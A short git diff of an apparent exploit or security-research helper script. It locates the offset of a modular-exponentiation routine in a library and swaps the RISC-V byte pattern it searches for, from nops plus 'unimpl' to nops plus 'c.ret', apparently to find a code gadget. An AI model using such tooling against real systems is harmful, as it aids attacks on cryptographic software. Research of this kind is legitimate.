@@ -17,8 +17,10 @@ def get_offsets(libpath):
     print(f"[+] MPI_EXP_MOD_OFFSET @ 0x{mpi_exp_mod_offset:x}")
 
     # c.nop, c.nop, c.nop, c.nop, unimpl, c.nop
-    pattern_bytes = b"\x01\x00\x01\x00\x01\x00\x01\x00\x00\x00\x01\x00"
-
+    # pattern_bytes = b"\x01\x00\x01\x00\x01\x00\x01\x00\x00\x00\x01\x00"
+    # c.nop, c.nop, c.nop, c.nop, c.ret, c.nop
+    pattern_bytes = b"\x01\x00\x01\x00\x01\x00\x01\x00\x82\x80\x01\x00"
+    # pattern_bytes = b"\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00"
     patterns_found = e.search(pattern_bytes, executable=True)
     one_offset = next(patterns_found, None)
     if one_offset is None:
